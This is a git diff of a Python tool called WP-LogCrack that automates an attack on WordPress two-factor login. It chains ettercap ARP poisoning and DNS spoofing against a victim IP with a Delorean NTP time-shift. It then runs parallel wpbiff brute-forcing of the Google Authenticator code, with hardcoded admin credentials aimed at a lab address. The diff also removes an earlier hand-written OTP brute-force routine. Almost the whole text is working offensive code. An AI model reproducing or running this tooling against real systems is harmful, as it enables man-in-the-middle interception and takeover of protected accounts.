@@ -1,16 +1,16 @@
 #!/usr/bin/python
-import multiprocessing
 import shlex
 import subprocess
-from multiprocessing import Pool
-
 import typer
 from requests import Session
 from rich.console import Console
+from rich.progress import Progress
 import pexpect
 from datetime import datetime
 from termcolor import colored
 from pyfiglet import Figlet
+
+from dependencies import checkDependencies
 
 console = Console()
 app = typer.Typer()
@@ -22,61 +22,37 @@ def banner():
     print(colored(f.renderText('WP-LogCrack'), 'green', attrs=["bold"]))
 
 
-def login(server, username, password, code):
-    headers = {'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"}
-    data = {
-        "log": username,
-        "pwd": password,
-        "googleotp": str(code).zfill(6),
-        'rememberme': 'forever'
-    }
-    response = session.post(f"{server}", headers=headers, data=data, allow_redirects=False, verify=False)
-    if response.status_code == 302:
-        result = {
-            'token': code,
-            'cookies': response.cookies.get_dict()
-        }
-        print(result)
-        return True
-    return False
-
-
-def bruteforce(server, username, password, start, end, event):
-    while event.is_set():
-        for code in range(start, end):
-            print("code " + str(code))
-            result = login(server, username, password, code)
-            if result:
-                event.clear()  # Stop running.
-                break
-
-
 def get_timestamp():
     data = datetime.today()
     minute = data.minute
-    minute = (minute + 2) % 60
+    minute = (minute - 2) % 60
+    hour = data.hour + 2
     if minute < 10:
         minute = "0" + str(minute)
-    timestamp = data.strftime('%Y-%m-%d %H:' + str(minute))
-
+    if int(minute) < 40:
+        hour = str((data.hour + 1) % 24)
+    timestamp = data.strftime('%Y-%m-%d ' + str(hour) + ':' + str(minute))
+    print(timestamp)
     return timestamp
 
 
 def ettercap(timestamp, server, username, password):
-    ip = input("Victim IP: ")
-    ip = "192.168.43.210"
+    ip = input("Enter the IP address of the vulnerable server: ")
+    ip = "192.168.43.167"
     cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
-    print("Ettercap Starting")
+    print("Ettercap Starting...")
     p = pexpect.spawn(cmd, timeout=None)
 
     if not p.eof():
-        print("Ettercap Started")
+        console.print("Ettercap Started!", style="bold green")
+        print("DNS Spoofing starting...")
 
     while not p.eof():
         str_line = str(p.readline())
         if "UDP  " + ip + ":" in str_line:
-            print(str_line)
+            console.print("DNS Spoofing activated!", style="bold green")
             delorean(timestamp, server, username, password)
+            break
 
 
 def delorean(timestamp, server, username, password):
@@ -85,81 +61,79 @@ def delorean(timestamp, server, username, password):
     p = pexpect.spawn(cmd, timeout=None)
 
     if not p.eof():
-        print("Delorean Started")
+        console.print("Delorean Started!", style="bold green")
 
     while not p.eof():
         str_line = str(p.readline())
         if "OSError: [Errno 98] Address already in use" in str_line:
-            print("Error: Delorean already started elsewhere")
+            console.print("Error: Delorean already started elsewhere!", style="bold red underline")
+            break
 
         if "Sent to" in str_line:
-            print(str_line)
             hour = (str_line[len(str_line) - 10: len(str_line) - 8])
             time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M')
             time = time.replace(hour=int(hour))
             time = str(time.strftime('%Y-%m-%d %H:%M'))
             wpbiff(time, server, username, password)
+            break
 
 
 def wpbiff(timestamp, server, username, password):
-    '''
-    processes = []
-    manager = multiprocessing.Manager()
-    event = manager.Event()
-    event.set()
-    process1 = multiprocessing.Process(target=bruteforce, args=(server, username, password, 0, 333333, event))
-    process2 = multiprocessing.Process(target=bruteforce, args=(server, username, password, 214300, 666666, event))
-    process3 = multiprocessing.Process(target=bruteforce, args=(server, username, password, 553200, 999999, event))
-
-    processes.append(process1)
-    processes.append(process2)
-    processes.append(process3)
-    process1.start()
-    process2.start()
-    process3.start()
-
-    for process in processes:
-        process.join()
-    '''
-
-    command_wp_biff1 = "sudo wpbiff -t 000000 -m 333333 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
-    command_wp_biff2 = "sudo wpbiff -t 333331 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
-    command_wp_biff3 = "sudo wpbiff -t 666661 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
+    print("WP-biff Starting...")
+    print(timestamp)
+    command_wp_biff1 = "sudo wpbiff -t 055500 -m 554300 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
+    command_wp_biff2 = "sudo wpbiff -t 554301 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
+    command_wp_biff3 = "sudo wpbiff -t 666667 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
 
     p1 = subprocess.Popen(shlex.split(command_wp_biff1), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     p2 = subprocess.Popen(shlex.split(command_wp_biff2), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     p3 = subprocess.Popen(shlex.split(command_wp_biff3), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-    with console.status("Discovering Token..."):
-        while True:
+    process = True
+    total_cont = 0
+    with Progress() as progress:
+        task = progress.add_task("[bold yellow]Discovering token...", total=999999)
+        while process:
             output1 = p1.stderr.read1().strip().decode("utf8")
             output2 = p2.stderr.read1().strip().decode("utf8")
             output3 = p3.stderr.read1().strip().decode("utf8")
 
-            if (output1 == '' and p1.poll() is not None) and \
-                    (output2 == '' and p2.poll() is not None) and \
-                    (output3 == '' and p3.poll() is not None) :
-                break
+            if "Token: " in output1 and int(output1.split(" ")[1]) > 0 and int(output2.split(" ")[1]) > 554300 and int(
+                    output3.split(" ")[1]) > 666666:
+                cont1 = int(output1.split(" ")[1])
+                cont2 = int(output2.split(" ")[1]) - 554300
+                cont3 = int(output3.split(" ")[1]) - 666666
 
-            if output1:
-                print(output1)
-                if "100%" in output1:
-                    print(p1.stdout.read().strip().decode("utf8").split("Great Success!")[1])
-                    break
-            if output2:
-                print(output2)
-                if "100%" in output2:
-                    print(p2.stdout.read().strip().decode("utf8").split("Great Success!")[1])
-                    break
-            if output3:
-                print(output3)
-                if "100%" in output3:
-                    print(p3.stdout.read().strip().decode("utf8").split("Great Success!")[1])
-                    break
+                current_advance = cont1 + cont2 + cont3 - total_cont
+                progress.update(task_id=task, description="[bold yellow]Discovering token " + str(
+                    cont1 + cont2 + cont3) + "/999999", advance=current_advance)
+                total_cont = (cont1 + cont2 + cont3)
 
-    p1.poll()
-    p2.poll()
-    p3.poll()
+            if ("Traceback (most recent call last):" in output1 or p1.poll() is not None) and \
+                    ("Traceback (most recent call last):" in output2 or p2.poll() is not None) and \
+                    ("Traceback (most recent call last):" in output3 or p3.poll() is not None):
+                process = False
+                console.print("Error wpbiff: Remote server did not respond. Is it down?",
+                              style="bold red underline")
+
+            if "100%" in output1:
+                progress.update(task_id=task, description="[bold green]Token found", advance=999999)
+                print(p1.stdout.read().strip().decode("utf8").split("Great Success!")[1])
+                process = False
+
+            if "100%" in output2:
+                progress.update(task_id=task, description="[bold green]Token found", advance=999999)
+                print(p2.stdout.read().strip().decode("utf8").split("Great Success!")[1])
+                process = False
+
+            if "100%" in output3:
+                progress.update(task_id=task, description="[bold green]Token found", advance=999999)
+                print(p3.stdout.read().strip().decode("utf8").split("Great Success!")[1])
+                process = False
+
+    p1.terminate()
+    p2.terminate()
+    p3.terminate()
 
 
 @app.callback()
@@ -185,19 +159,20 @@ def main(
             prompt=True,
             help=f"DNS spoofing attack"
         )):
-
     banner()
-    server = "http://192.168.43.210/wordpress/wp-login.php"
-    username = "admin"
-    password = "ubuntu"
-    with console.status("Getting timestamp to use for the Attack"):
-        timestamp = get_timestamp()
-        print("The timestamp chosen for the attack is: " + timestamp)
-
-    if dns_spoof:
-        ettercap(timestamp, server, username, password)
-    else:
-        delorean(timestamp, server, username, password)
+    if checkDependencies():
+        server = "http://192.168.43.167/wordpress/wp-login.php"
+        username = "admin"
+        password = "ubuntu"
+        with console.status("Getting timestamp to use for the Attack"):
+            timestamp = get_timestamp()
+            console.print("The timestamp chosen for the attack is: " + timestamp,
+                          style="bold dim cyan underline")
+        if dns_spoof:
+            ettercap(timestamp, server, username, password)
+        else:
+            delorean(timestamp, server, username, password)
+            # wpbiff(timestamp, server, username, password)
 
 
 def run():
